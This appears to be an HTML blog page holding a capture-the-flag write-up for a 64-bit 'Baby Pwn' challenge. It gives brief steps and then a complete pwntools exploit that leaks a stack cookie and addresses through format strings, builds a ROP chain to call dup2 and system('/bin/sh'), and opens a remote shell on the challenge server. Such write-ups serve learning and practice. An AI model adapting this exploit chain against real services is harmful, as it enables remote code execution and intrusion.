@@ -1,0 +1,196 @@
+    <html>
+     <head>
+    <title> Blog </title>
+     
+     <link rel="stylesheet" type="text/css" href="test1.css" />
+     <link rel="stylesheet" type="text/css" href="fonts.css" />
+    </head>
+    <style>
+     
+          body {background-color:white;
+    	border-bottom:1px solid #bfbfbf
+             line-height:1.5em;
+    	color:#222}
+     
+       p{color:black;
+            /*font-style: italic;
+           font-family: "Times New Roman";*/
+          letter-spacing: 2px;
+           font-size: 20px;
+           margin-top: 10px;
+           margin-bottom: 10px;
+            margin-right: 150px;
+           margin-left: 150px; 
+           }
+     
+     
+     
+        h1{ color:black;
+             font-style: italic;
+            font-size:2.2em;
+    	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+    	font-weight:normal;
+    	line-height:1.2em;
+    	margin-bottom:0.6667em
+            margin-right: 150px;
+           margin-left: 150px;}
+     
+    code { 
+    display: block; white-space: pre-wrap; 
+    border: 1px solid #000; 
+    padding: 10px; 
+    line-height: 1.5em; 
+    font-family: "Lucida Console", Monaco, monospace; 
+    } 
+    .code-str 
+    { color:#ff33d4; } 
+     .code-comment { color:#3c33ff; } 
+     .code-key { color:#9933ff; }
+     .code-brown{color:#ba4a00} 
+     
+     
+    </style>
+    <body>
+     
+    <script src="null.js"></script>
+     
+    <div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+     <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+     <p style="color:white;font-size:2.2em;"> Blog </p>
+     </div>
+     </div>
+     
+     
+     <br> <br>  <br>          
+     
+    <h1 class="post-title"> Baby Pwn [50] </h1>
+
+     <br> 
+     
+    <p> I have to accept this one was most difficult i have faced it had all the protection,but also had all vuln ,so let me briefly say how to pwn   <br><br>
+        1) we could just overflow it but we have stack cookie , so we have to leak it via format string <br><br>
+        2) we can then do <b>ret2libc</b> by leaking a libc addr (libc_start_main+240) <br><br>
+        <b>3) but the problem is it's 64 bit in which the function arguments must be loaded in registers not on stack </b><br><br>
+         4) so we need to do <b>ROP</b> to do that we need to leak the .text segment addr as <b>pie</b> enabled :(  </p>
+     
+    <code>
+from pwn import *
+
+context.bits= 64
+libc = ELF('libc.so')
+r = remote("baby.teaser.insomnihack.ch",1337)
+#r = remote("localhost",1337)
+
+msg = r.recvuntil(">")
+print msg 
+
+r.sendline("2")
+
+msg = r.recvuntil(">")
+print msg 
+r.sendline("%138$p")
+cookie_leak = r.recvline()
+print "[+] leaked cookie : "+cookie_leak
+
+msg = r.recvuntil(">")
+print msg
+
+r.sendline("%140$p")
+handle_leak = r.recvline()
+print "[+] handle<+123> : "+handle_leak
+
+msg = r.recvuntil(">")
+print msg
+
+r.sendline("%158$p")
+libc240 = r.recvline()
+libc_leak = int(libc240.strip('\n'),16)-240 # libc leak 
+
+dostack = int(handle_leak.strip('\n'),16)-1469
+print "[+] dostack addr :"+hex(dostack)   # .text segment leak 
+
+dprintf_plt = int(handle_leak.strip('\n'),16)-2847
+print "[+] dprintf_plt addr :"+hex(dprintf_plt)
+
+pop_rdi = int(handle_leak.strip('\n'),16) + 700
+pop_rsi_r15 = int(handle_leak.strip('\n'),16) +698
+ret = int(handle_leak.strip('\n'),16) + 47
+dprintf_got = dprintf_plt+0x202080
+
+system_offset = libc.symbols['system']-libc.symbols['__libc_start_main']
+binsh_offset =  libc.search("/bin/sh").next()-libc.symbols['__libc_start_main']
+dup2_offset =   libc.symbols['dup2']-libc.symbols['__libc_start_main']
+
+system = libc_leak+system_offset 
+binsh =  libc_leak+binsh_offset 
+dup2 =   libc_leak+dup2_offset
+
+"""system = libc_leak+146048
+binsh =  libc_leak+1489549
+dup2  =   libc_leak+881216"""
+
+print "[+] dprintf@got.plt"+hex(dprintf_got)
+print "[+] pop rdi :"+hex(pop_rdi)
+print "[+] pop rdi,pop rsi  :"+hex(pop_rsi_r15)
+print "[+] ret :"+hex(ret)
+print "[+] libc_start_main :"+hex(libc_leak)
+print "[+] system"+hex(system)
+print "[+] /bin/sh"+hex(binsh)
+
+msg = r.recvuntil(">")
+print msg 
+
+r.send("\n")
+
+msg = r.recvuntil(">")
+print msg 
+
+r.sendline("1")
+
+msg = r.recvuntil("?")
+print msg
+
+payload = "A"*1032
+payload +=  pack(int(cookie_leak.strip('\n'),16))
+payload += "A"*8
+payload += pack(pop_rdi)
+payload += pack(4)
+payload += pack(pop_rsi_r15)
+payload += pack(0)
+payload += pack(0)
+payload += pack(dup2)
+payload += pack(pop_rdi)
+payload += pack(4)
+payload += pack(pop_rsi_r15)
+payload += pack(1)
+payload += pack(0)
+payload += pack(dup2)
+payload += pack(pop_rdi)
+payload += pack(binsh)
+payload += pack(pop_rsi_r15)
+payload += pack(0)
+payload +="A"*8
+payload +=pack(ret)
+payload +=pack(system)
+
+r.sendline(str(len(payload)))
+
+r.sendline(payload)
+
+msg = r.recvline()
+print msg 
+
+r.interactive()
+
+"""pack(pop_rsi_r15)+pack(dprintf_got)+"A"*8+pack(ret)+pack(dprintf_plt)
+
+data = r.recvline()
+data = r.recvline()
+print repr(data)"""
+
+
+</code>
+     
+     
+    </body>
+    </html>
